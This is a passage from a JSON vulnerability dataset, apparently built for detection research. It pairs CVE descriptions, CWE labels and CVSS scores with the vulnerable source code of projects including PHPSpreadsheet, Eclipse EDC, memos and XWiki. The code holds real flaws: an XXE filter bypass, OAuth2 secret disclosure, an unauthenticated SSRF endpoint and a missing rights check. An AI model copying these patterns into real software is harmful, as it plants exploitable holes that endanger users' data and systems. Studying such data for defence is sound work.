(!isChildPath(resolvedBasePath, resolveRealPath(targetPath))) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\nfunction resolveRealPath(path: string): string {\n  try {\n    return realPath(path);\n  } catch (ex) {\n    if (ex.code !== 'ENOENT') {\n      throw ex;\n    }\n  }\n\n  return path;\n}\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 75,
          "content": "  return targetPath;"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 1120,
    "cve": "CVE-2024-45048",
    "description": "PHPSpreadsheet is a pure PHP library for reading and writing spreadsheet files. Affected versions are subject to a bypassing of a filter which allows for an XXE-attack. This in turn allows attacker to obtain contents of local files, even if error reporting is muted. This vulnerability has been addressed in release version 2.2.1. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/PhpSpreadsheet/Reader/Security/XmlScanner.php",
          "content": "<?php\n\nnamespace PhpOffice\\PhpSpreadsheet\\Reader\\Security;\n\nuse PhpOffice\\PhpSpreadsheet\\Reader;\n\nclass XmlScanner\n{\n    private string $pattern;\n\n    /** @var ?callable */\n    private $callback;\n\n    public function __construct(string $pattern = '<!DOCTYPE')\n    {\n        $this->pattern = $pattern;\n    }\n\n    public static function getInstance(Reader\\IReader $reader): self\n    {\n        $pattern = ($reader instanceof Reader\\Html) ? '<!ENTITY' : '<!DOCTYPE';\n\n        return new self($pattern);\n    }\n\n    public function setAdditionalCallback(callable $callback): void\n    {\n        $this->callback = $callback;\n    }\n\n    private static function forceString(mixed $arg): string\n    {\n        return is_string($arg) ? $arg : '';\n    }\n\n    private function toUtf8(string $xml): string\n    {\n        $pattern = '/encoding=\"(.*?)\"/';\n        $result = preg_match($pattern, $xml, $matches);\n        $charset = strtoupper($result ? $matches[1] : 'UTF-8');\n\n        if ($charset !== 'UTF-8') {\n            $xml = self::forceString(mb_convert_encoding($xml, 'UTF-8', $charset));\n\n            $result = preg_match($pattern, $xml, $matches);\n            $charset = strtoupper($result ? $matches[1] : 'UTF-8');\n            if ($charset !== 'UTF-8') {\n                throw new Reader\\Exception('Suspicious Double-encoded XML, spreadsheet file load() aborted to prevent XXE/XEE attacks');\n            }\n        }\n\n        return $xml;\n    }\n\n    /**\n     * Scan the XML for use of <!ENTITY to prevent XXE/XEE attacks.\n     *\n     * @param false|string $xml\n     */\n    public function scan($xml): string\n    {\n        $xml = \"$xml\";\n\n        $xml = $this->toUtf8($xml);\n\n        // Don't rely purely on libxml_disable_entity_loader()\n        $pattern = '/\\\\0?' . implode('\\\\0?', str_split($this->pattern)) . '\\\\0?/';\n\n        if (preg_match($pattern, $xml)) {\n            throw new Reader\\Exception('Detected use of ENTITY in XML, spreadsheet file load() aborted to prevent XXE/XEE attacks');\n        }\n\n        if ($this->callback !== null) {\n            $xml = call_user_func($this->callback, $xml);\n        }\n\n        return $xml;\n    }\n\n    /**\n     * Scan theXML for use of <!ENTITY to prevent XXE/XEE attacks.\n     */\n    public function scanFile(string $filestream): string\n    {\n        return $this->scan(file_get_contents($filestream));\n    }\n}\n"
        }
      ],
      "method_level": [
        "private function toUtf8(string $xml): string\n    {\n        $pattern = '/encoding=\"(.*?)\"/';\n        $result = preg_match($pattern, $xml, $matches);\n        $charset = strtoupper($result ? $matches[1] : 'UTF-8');\n\n        if ($charset !== 'UTF-8') {\n            $xml = self::forceString(mb_convert_encoding($xml, 'UTF-8', $charset));\n\n            $result = preg_match($pattern, $xml, $matches);\n            $charset = strtoupper($result ? $matches[1] : 'UTF-8');\n            if ($charset !== 'UTF-8') {\n                throw new Reader\\Exception('Suspicious Double-encoded XML, spreadsheet file load() aborted to prevent XXE/XEE attacks');\n            }\n        }\n\n        return $xml;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 38,
          "content": "        $pattern = '/encoding=\"(.*?)\"/';"
        },
        {
          "line_no": 39,
          "content": "        $result = preg_match($pattern, $xml, $matches);"
        },
        {
          "line_no": 40,
          "content": "        $charset = strtoupper($result ? $matches[1] : 'UTF-8');"
        },
        {
          "line_no": 45,
          "content": "            $result = preg_match($pattern, $xml, $matches);"
        },
        {
          "line_no": 46,
          "content": "            $charset = strtoupper($result ? $matches[1] : 'UTF-8');"
        }
      ]
    },
    "cwe": [
      "CWE-611"
    ],
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_version": 3.1
  },
  {
    "id": 723,
    "cve": "CVE-2024-4536",
    "description": "In Eclipse Dataspace Components from version 0.2.1 to 0.6.2, in the EDC Connector component ( https://github.com/eclipse-edc/Connector ), an attacker might obtain OAuth2 client secrets from the vault.\n\nIn Eclipse Dataspace Components from version 0.2.1 to 0.6.2, we have identified a security vulnerability in the EDC Connector component ( https://github.com/eclipse-edc/Connector ) regarding the OAuth2-protected data sink feature. When using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider's vault, not the consumer. This secret's value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.\n\nThis feature is now disabled entirely, because not all code paths necessary for a successful realization were fully implemented.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java",
          "content": "/*\n *  Copyright (c) 2021 Microsoft Corporation\n *\n *  This program and the accompanying materials are made available under the\n *  terms of the Apache License, Version 2.0 which is available at\n *  https://www.apache.org/licenses/LICENSE-2.0\n *\n *  SPDX-License-Identifier: Apache-2.0\n *\n *  Contributors:\n *       Microsoft Corporation - initial API and implementation\n *       Siemens AG - changes to make it compatible with AWS S3, Azure blob and ALI Object Storage presigned URL for upload\n *\n */\n\npackage org.eclipse.edc.connector.dataplane.http.oauth2;\n\nimport org.eclipse.edc.connector.dataplane.http.spi.HttpRequestParamsProvider;\nimport org.eclipse.edc.iam.oauth2.spi.client.Oauth2Client;\nimport org.eclipse.edc.keys.spi.PrivateKeyResolver;\nimport org.eclipse.edc.runtime.metamodel.annotation.Extension;\nimport org.eclipse.edc.runtime.metamodel.annotation.Inject;\nimport org.eclipse.edc.spi.security.Vault;\nimport org.eclipse.edc.spi.system.ServiceExtension;\nimport org.eclipse.edc.spi.system.ServiceExtensionContext;\n\nimport java.time.Clock;\n\n/**\n * Provides support for adding OAuth2 authentication to http data transfer\n */\n@Extension(value = DataPlaneHttpOauth2Extension.NAME)\npublic class DataPlaneHttpOauth2Extension implements ServiceExtension {\n    public static final String NAME = \"Data Plane HTTP OAuth2\";\n\n    @Inject\n    private Clock clock;\n\n    @Inject\n    private HttpRequestParamsProvider paramsProvider;\n\n    @Inject\n    private Vault vault;\n\n    @Inject\n    private PrivateKeyResolver privateKeyResolver;\n\n    @Inject\n    private Oauth2Client oauth2Client;\n\n    @Override\n    public String name() {\n        return NAME;\n    }\n\n    @Override\n    public void initialize(ServiceExtensionContext context) {\n        var requestFactory = new Oauth2CredentialsRequestFactory(privateKeyResolver, clock, vault, context.getMonitor());\n        var oauth2ParamsDecorator = new Oauth2HttpRequestParamsDecorator(requestFactory, oauth2Client);\n\n        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);\n        paramsProvider.registerSourceDecorator(oauth2ParamsDecorator);\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public void initialize(ServiceExtensionContext context) {\n        var requestFactory = new Oauth2CredentialsRequestFactory(privateKeyResolver, clock, vault, context.getMonitor());\n        var oauth2ParamsDecorator = new Oauth2HttpRequestParamsDecorator(requestFactory, oauth2Client);\n\n        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);\n        paramsProvider.registerSourceDecorator(oauth2ParamsDecorator);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 61,
          "content": "        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);"
        }
      ]
    },
    "cwe": [
      "CWE-201",
      "CWE-522"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 681,
    "cve": "CVE-2024-29028",
    "description": "memos is a privacy-first, lightweight note-taking service. In memos 0.13.2, an SSRF vulnerability exists at the /o/get/httpmeta that allows unauthenticated users to enumerate the internal network and receive limited html values in json form. This vulnerability is fixed in 0.16.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/v1/http_getter.go",
          "content": "package v1\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n\n\t\"github.com/labstack/echo/v4\"\n\n\tgetter \"github.com/usememos/memos/plugin/http-getter\"\n)\n\nfunc (*APIV1Service) registerGetterPublicRoutes(g *echo.Group) {\n\t// GET /get/httpmeta?url={url} - Get website meta.\n\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)\n\n\t// GET /get/image?url={url} - Get image.\n\tg.GET(\"/get/image\", GetImage)\n}\n\n// GetWebsiteMetadata godoc\n//\n//\t@Summary\tGet website metadata\n//\t@Tags\t\tget\n//\t@Produce\tjson\n//\t@Param\t\turl\tquery\t\tstring\t\t\ttrue\t\"Website URL\"\n//\t@Success\t200\t{object}\tgetter.HTMLMeta\t\"Extracted metadata\"\n//\t@Failure\t400\t{object}\tnil\t\t\t\t\"Missing website url | Wrong url\"\n//\t@Failure\t406\t{object}\tnil\t\t\t\t\"Failed to get website meta with url: %s\"\n//\t@Router\t\t/o/get/GetWebsiteMetadata [GET]\nfunc GetWebsiteMetadata(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\thtmlMeta, err := getter.GetHTMLMeta(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)\n\t}\n\treturn c.JSON(http.StatusOK, htmlMeta)\n}\n\n// GetImage godoc\n//\n//\t@Summary\tGet GetImage from URL\n//\t@Tags\t\tget\n//\t@Produce\tGetImage/*\n//\t@Param\t\turl\tquery\t\tstring\ttrue\t\"Image url\"\n//\t@Success\t200\t{object}\tnil\t\t\"Image\"\n//\t@Failure\t400\t{object}\tnil\t\t\"Missing GetImage url | Wrong url | Failed to get GetImage url: %s\"\n//\t@Failure\t500\t{object}\tnil\t\t\"Failed to write GetImage blob\"\n//\t@Router\t\t/o/get/GetImage [GET]\nfunc GetImage(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing image url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\timage, err := getter.GetImage(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, fmt.Sprintf(\"Failed to get image url: %s\", urlStr)).SetInternal(err)\n\t}\n\n\tc.Response().Writer.WriteHeader(http.StatusOK)\n\tc.Response().Writer.Header().Set(\"Content-Type\", image.Mediatype)\n\tc.Response().Writer.Header().Set(echo.HeaderCacheControl, \"max-age=31536000, immutable\")\n\tif _, err := c.Response().Writer.Write(image.Blob); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusInternalServerError, \"Failed to write image blob\").SetInternal(err)\n\t}\n\treturn nil\n}\n"
        }
      ],
      "method_level": [
        "func (*APIV1Service) registerGetterPublicRoutes(g *echo.Group) {\n\t// GET /get/httpmeta?url={url} - Get website meta.\n\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)\n\n\t// GET /get/image?url={url} - Get image.\n\tg.GET(\"/get/image\", GetImage)\n}",
        "func GetWebsiteMetadata(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\thtmlMeta, err := getter.GetHTMLMeta(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)\n\t}\n\treturn c.JSON(http.StatusOK, htmlMeta)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "\t// GET /get/httpmeta?url={url} - Get website meta."
        },
        {
          "line_no": 15,
          "content": "\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)"
        },
        {
          "line_no": 31,
          "content": "func GetWebsiteMetadata(c echo.Context) error {"
        },
        {
          "line_no": 32,
          "content": "\turlStr := c.QueryParam(\"url\")"
        },
        {
          "line_no": 33,
          "content": "\tif urlStr == \"\" {"
        },
        {
          "line_no": 34,
          "content": "\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")"
        },
        {
          "line_no": 35,
          "content": "\t}"
        },
        {
          "line_no": 36,
          "content": "\tif _, err := url.Parse(urlStr); err != nil {"
        },
        {
          "line_no": 37,
          "content": "\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)"
        },
        {
          "line_no": 38,
          "content": "\t}"
        },
        {
          "line_no": 40,
          "content": "\thtmlMeta, err := getter.GetHTMLMeta(urlStr)"
        },
        {
          "line_no": 41,
          "content": "\tif err != nil {"
        },
        {
          "line_no": 42,
          "content": "\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)"
        },
        {
          "line_no": 43,
          "content": "\t}"
        },
        {
          "line_no": 44,
          "content": "\treturn c.JSON(http.StatusOK, htmlMeta)"
        },
        {
          "line_no": 45,
          "content": "}"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.8,
    "cvss_version": 3.1
  },
  {
    "id": 69,
    "cve": "CVE-2025-29925",
    "description": "XWiki Platform is a generic wiki platform. Prior to 15.10.14, 16.4.6, and 16.10.0-rc-1, protected pages are listed when requesting the REST endpoints /rest/wikis/[wikiName]/pages even if the user doesn't have view rights on them. It's particularly true if the entire wiki is protected with \"Prevent unregistered user to view pages\": the endpoint would still list the pages of the wiki, though only for the main wiki. The problem has been patched in XWiki 15.10.14, 16.4.6, 16.10.0RC1. In those versions the endpoint can still be requested but the result is filtered out based on pages rights.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-rest/xwiki-platform-rest-server/src/main/java/org/xwiki/rest/internal/resources/wikis/WikiPagesResourceImpl.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.rest.internal.resources.wikis;\n\nimport java.net.URL;\nimport java.util.Formatter;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.inject.Named;\n\nimport org.xwiki.component.annotation.Component;\nimport org.xwiki.query.Query;\nimport org.xwiki.query.QueryException;\nimport org.xwiki.rest.Relations;\nimport org.xwiki.rest.XWikiResource;\nimport org.xwiki.rest.XWikiRestException;\nimport org.xwiki.rest.internal.Utils;\nimport org.xwiki.rest.model.jaxb.Link;\nimport org.xwiki.rest.model.jaxb.PageSummary;\nimport org.xwiki.rest.model.jaxb.Pages;\nimport org.xwiki.rest.resources.pages.PageResource;\nimport org.xwiki.rest.resources.wikis.WikiPagesResource;\n\nimport com.xpn.xwiki.api.Document;\nimport com.xpn.xwiki.doc.XWikiDocument;\n\n/**\n * @version $Id$\n */\n@Component\n@Named(\"org.xwiki.rest.internal.resources.wikis.WikiPagesResourceImpl\")\npublic class WikiPagesResourceImpl extends XWikiResource implements WikiPagesResource\n{\n    @Override\n    public Pages getPages(String wikiName, Integer start, String name, String space, String author, Integer number)\n            throws XWikiRestException\n    {\n        String database = Utils.getXWikiContext(componentManager).getWikiId();\n\n        Pages pages = objectFactory.createPages();\n\n        /* This try is just needed for executing the finally clause. */\n        try {\n            Map<String, String> filters = new HashMap<String, String>();\n            if (!name.equals(\"\")) {\n                filters.put(\"name\", name);\n            }\n            if (!space.equals(\"\")) {\n                filters.put(\"space\", Utils.getLocalSpaceId(parseSpaceSegments(space)));\n            }\n            if (!author.equals(\"\")) {\n                filters.put(\"author\", author);\n            }\n\n            /* Build the query */\n            Formatter f = new Formatter();\n            f.format(\"select doc from XWikiDocument as doc\");\n\n            if (filters.keySet().size() > 0) {\n                f.format(\" where (\");\n\n                int i = 0;\n                for (String param : filters.keySet()) {\n                    if (param.equals(\"name\")) {\n                        f.format(\" upper(doc.fullName) like :name \");\n                    }\n\n                    if (param.equals(\"space\")) {\n                        f.format(\" upper(doc.space) like :space \");\n                    }\n\n                    if (param.equals(\"author\")) {\n                        f.format(\" upper(doc.contentAuthor) like :author \");\n                    }\n\n                    i++;\n\n                    if (i < filters.keySet().size()) {\n                        f.format(\" and \");\n                    }\n                }\n\n                f.format(\")\");\n            }\n\n            String queryString = f.toString();\n\n            /* Execute the query by filling the parameters */\n            List<Object> queryResult = null;\n            try {\n                Query query = queryManager.createQuery(queryString, Query.XWQL).setLimit(number).setOffset(start);\n                for (String param : filters.keySet()) {\n                    query.bindValue(param, String.format(\"%%%s%%\", filters.get(param).toUpperCase()));\n                }\n\n                queryResult = query.execute();\n            } catch (QueryException e) {\n                throw new XWikiRestException(e);\n            }\n\n            /* Get the results and populate the returned representation */\n            for (Object object : queryResult) {\n                XWikiDocument xwikiDocument = (XWikiDocument) object;\n                xwikiDocument.setDatabase(wikiName);\n\n                Document doc = new Document(xwikiDocument, Utils.getXWikiContext(componentManager));\n\n                /*\n                 * We manufacture page summaries in place because we don't have all the data for calling the\n                 * DomainObjectFactory method (doing so would require to retrieve an actual Document)\n                 */\n                PageSummary pageSummary = objectFactory.createPageSummary();\n                pageSummary.setId(doc.getPrefixedFullName());\n                pageSummary.setFullName(doc.getFullName());\n                pageSummary.setWiki(wikiName);\n                pageSummary.setSpace(doc.getSpace());\n                pageSummary.setName(doc.getDocumentReference().getName());\n                pageSummary.setTitle(doc.getTitle());\n                pageSummary.setParent(doc.getParent());\n\n                URL absoluteUrl = Utils.getXWikiContext(componentManager).getURLFactory().createExternalURL(\n                    doc.getSpace(), doc.getDocumentReference().getName(), \"view\", null, null,\n                    Utils.getXWikiContext(componentManager));\n                pageSummary.setXwikiAbsoluteUrl(absoluteUrl.toString());\n                pageSummary.setXwikiRelativeUrl(Utils.getXWikiContext(componentManager).getURLFactory().getURL(\n                    absoluteUrl, Utils.getXWikiContext(componentManager)));\n\n                String pageUri = Utils\n                    .createURI(uriInfo.getBaseUri(), PageResource.class, doc.getWiki(),\n                        Utils.getSpacesURLElements(doc.getDocumentReference()), doc.getDocumentReference().getName())\n                    .toString();\n                Link pageLink = objectFactory.createLink();\n                pageLink.setHref(pageUri);\n                pageLink.setRel(Relations.PAGE);\n                pageSummary.getLinks().add(pageLink);\n\n                pages.getPageSummaries().add(pageSummary);\n            }\n        } finally {\n            Utils.getXWikiContext(componentManager).setWikiId(database);\n        }\n\n        return pages;\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public Pages getPages(String wikiName, Integer start, String name, String space, String author, Integer number)\n            throws XWikiRestException\n    {\n        String database = Utils.getXWikiContext(componentManager).getWikiId();\n\n        Pages pages = objectFactory.createPages();\n\n        /* This try is just needed for executing the finally clause. */\n        try {\n            Map<String, String> filters = new HashMap<String, String>();\n            if (!name.equals(\"\")) {\n                filters.put(\"name\", name);\n            }\n            if (!space.equals(\"\")) {\n                filters.put(\"space\", Utils.getLocalSpaceId(parseSpaceSegments(space)));\n            }\n            if (!author.equals(\"\")) {\n                filters.put(\"author\", author);\n            }\n\n            /* Build the query */\n            Formatter f = new Formatter();\n            f.format(\"select doc from XWikiDocument as doc\");\n\n            if (filters.keySet().size() > 0) {\n                f.format(\" where (\");\n\n                int i = 0;\n                for (String param : filters.keySet()) {\n                    if (param.equals(\"name\")) {\n                        f.format(\" upper(doc.fullName) like :name \");\n                    }\n\n                    if (param.equals(\"space\")) {\n                        f.format(\" upper(doc.space) like :space \");\n                    }\n\n                    if (param.equals(\"author\")) {\n                        f.format(\" upper(doc.contentAuthor) like :author \");\n                    }\n\n                    i++;\n\n                    if (i < filters.keySet().size()) {\n                        f.format(\" and \");\n                    }\n                }\n\n                f.format(\")\");\n            }\n\n            String queryString = f.toString();\n\n            /* Execute the query by filling the parameters */\n            List<Object> queryResult = null;\n            try {\n                Query query = queryManager.createQuery(queryString, Query.XWQL).setLimit(number).setOffset(start);\n                for (String param : filters.keySet()) {\n                    query.bindValue(param, String.format(\"%%%s%%\", filters.get(param).toUpperCase()));\n                }\n\n                queryResult = query.execute();\n            } catch (QueryException e) {\n                throw new XWikiRestException(e);\n            }\n\n            /* Get the results and populate the returned representation */\n            for (Object object : queryResult) {\n                XWikiDocument xwikiDocument = (XWikiDocument) object;\n                xwikiDocument.setDatabase(wikiName);\n\n                Document doc = new Document(xwikiDocument, Utils.getXWikiContext(componentManager));\n\n                /*\n                 * We manufacture page summaries in place because we don't have all the data for calling the\n                 * DomainObjectFactory method (doing so would require to retrieve an actual Document)\n                 */\n                PageSummary pageSummary = objectFactory.createPageSummary();\n                pageSummary.setId(doc.getPrefixedFullName());\n                pageSummary.setFullName(doc.getFullName());\n                pageSummary.setWiki(wikiName);\n                pageSummary.setSpace(doc.getSpace());\n                pageSummary.setName(doc.getDocumentReference().getName());\n                pageSummary.setTitle(doc.getTitle());\n                pageSummary.setParent(doc.getParent());\n\n                URL absoluteUrl = Utils.getXWikiContext(componentManager).getURLFactory().createExternalURL(\n                    doc.getSpace(), doc.getDocumentReference().getName(), \"view\", null, null,\n                    Utils.getXWikiContext(componentManager));\n                pageSummary.setXwikiAbsoluteUrl(absoluteUrl.toString());\n                pageSummary.setXwikiRelativeUrl(Utils.getXWikiContext(componentManager).getURLFactory().getURL(\n                    absoluteUrl, Utils.getXWikiContext(componentManager)));\n\n                String pageUri = Utils\n                    .createURI(uriInfo.getBaseUri(), PageResource.class, doc.getWiki(),\n                        Utils.getSpacesURLElements(doc.getDocumentReference()), doc.getDocumentReference().getName())\n                    .toString();\n                Link pageLink = objectFactory.createLink();\n                pageLink.setHref(pageUri);\n                pageLink.setRel(Relations.PAGE);\n                pageSummary.getLinks().add(pageLink);\n\n                pages.getPageSummaries().add(pageSummary);\n            }\n        } finally {\n            Utils.getXWikiContext(componentManager).setWikiId(database);\n        }\n\n        return pages;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "        String database = Utils.getXWikiContext(componentManager).getWikiId();"
        },
        {
          "line_no": 61,
          "content": "        /* This try is just needed for executing the finally clause. */"
        },
        {
          "line_no": 63,
          "content": "            Map<String, String> filters = new HashMap<String, String>();"
        },
        {
          "line_no": 64,
          "content": "            if (!name.equals(\"\")) {"
        },
        {
          "line_no": 67,
          "content": "            if (!space.equals(\"\")) {"
        },
        {
          "line_no": 70,
          "content": "            if (!author.equals(\"\")) {"
        },
        {
          "line_no": 75,
          "content": "            Formatter f = new Formatter();"
        },
        {
          "line_no": 76,
          "content": "            f.format(\"select doc from XWikiDocument as doc\");"
        },
        {
          "line_no": 78,
          "content": "            if (filters.keySet().size() > 0) {"
        },
        {
          "line_no": 79,
          "content": "                f.format(\" where (\");"
        },
        {
          "line_no": 84,
          "content": "                        f.format(\" upper(doc.fullName) like :name \");"
        },
        {
          "line_no": 88,
          "content": "                        f.format(\" upper(doc.space) like :space \");"
        },
        {
          "line_no": 92,
          "content": "                        f.format(\" upper(doc.contentAuthor) like :author \");"
        },
        {
          "line_no": 98,
          "content": "                        f.format(\" and \");"
        },
        {
          "line_no": 102,
          "content": "                f.format(\")\");"
        },
        {
          "line_no": 105,
          "content": "            String queryString = f.toString();"
        },
        {
          "line_no": 109,
          "content": "            try {"
        },
        {
          "line_no": 110,
          "content": "                Query query = queryManager.createQuery(queryString, Query.XWQL).setLimit(number).setOffset(start);"
        },
        {
          "line_no": 111,
          "content": "                for (String param : filters.keySet()) {"
        },
        {
          "line_no": 112,
          "content": "                    query.bindValue(param, String.format(\"%%%s%%\", filters.get(param).toUpperCase()));"
        },
        {
          "line_no": 113,
          "content": "                }"
        },
        {
          "line_no": 115,
          "content": "                queryResult = query.execute();"
        },
        {
          "line_no": 116,
          "content": "            } catch (QueryException e) {"
        },
        {
          "line_no": 117,
          "content": "                throw new XWikiRestException(e);"
        },
        {
          "line_no": 123,
          "content": "                xwikiDocument.setDatabase(wikiName);"
        },
        {
          "line_no": 125,
          "content": "                Document doc = new Document(xwikiDocument, Utils.getXWikiContext(componentManager));"
        },
        {
          "line_no": 127,
          "content": "                /*"
        },
        {
          "line_no": 128,
          "content": "                 * We manufacture page summaries in place because we don't have all the data for calling the"
        },
        {
          "line_no": 129,
          "content": "                 * DomainObjectFactory method (doing so would require to retrieve an actual Document)"
        },
        {
          "line_no": 130,
          "content": "                 */"
        },
        {
          "line_no": 131,
          "content": "                PageSummary pageSummary = objectFactory.createPageSummary();"
        },
        {
          "line_no": 132,
          "content": "                pageSummary.setId(doc.getPrefixedFullName());"
        },
        {
          "line_no": 133,
          "content": "                pageSummary.setFullName(doc.getFullName());"
        },
        {
          "line_no": 134,
          "content": "                pageSummary.setWiki(wikiName);"
        },
        {
          "line_no": 135,
          "content": "                pageSummary.setSpace(doc.getSpace());"
        },
        {
          "line_no": 136,
          "content": "                pageSummary.setName(doc.getDocumentReference().getName());"
        },
        {
          "line_no": 137,
          "content": "                pageSummary.setTitle(doc.getTitle());"
        },
        {
          "line_no": 138,
          "content": "                pageSummary.setParent(doc.getParent());"
        },
        {
          "line_no": 140,
          "content": "                URL absoluteUrl = Utils.getXWikiContext(componentManager).getURLFactory().createExternalURL("
        },
        {
          "line_no": 141,
          "content": "                    doc.getSpace(), doc.getDocumentReference().getName(), \"view\", null, null,"
        },
        {
          "line_no": 142,
          "content": "                    Utils.getXWikiContext(componentManager));"
        },
        {
          "line_no": 143,
          "content": "                pageSummary.setXwikiAbsoluteUrl(absoluteUrl.toString());"
        },
        {
          "line_no": 144,
          "content": "                pageSummary.setXwikiRelativeUrl(Utils.getXWikiContext(componentManager).getURLFactory().getURL("
        },
        {
          "line_no": 145,
          "content": "                    absoluteUrl, Utils.getXWikiContext(componentManager)));"
        },
        {
          "line_no": 147,
          "content": "                String pageUri = Utils"
        },
        {
          "line_no": 148,
          "content": "                    .createURI(uriInfo.getBaseUri(), PageResource.class, doc.getWiki(),"
        },
        {
          "line_no": 149,
          "content": "                        Utils.getSpacesURLElements(doc.getDocumentReference()), doc.getDocumentReference().getName())"
        },
        {
          "line_no": 150,
          "content": "                    .toString();"
        },
        {
          "line_no": 151,
          "content": "                Link pageLink = objectFactory.createLink();"
        },
        {
          "line_no": 152,
          "content": "                pageLink.setHref(pageUri);"
        },
        {
          "line_no": 153,
          "content": "                pageLink.setRel(Relations.PAGE);"
        },
        {
          "line_no": 154,
          "content": "                pageSummary.getLinks().add(pageLink);"
        },
        {
          "line_no": 156,
          "content": "                pages.getPageSummaries().add(pageSummary);"
        },
        {
          "line_no": 159,
          "content": "            Utils.getXWikiContext(componentManager).setWikiId(database);"
        }
      ]
    },
    "cwe": [
      "CWE-402"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 4.0
  },
  {
    "id": 1166,
    "cve": "CVE-2024-43800",
    "description": "serve-static serves static files. serve-static passes untrusted user input - even after sanitizing it - to redirect() may execute untrusted code. This issue is patched in serve-static 1.16.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "index.js",
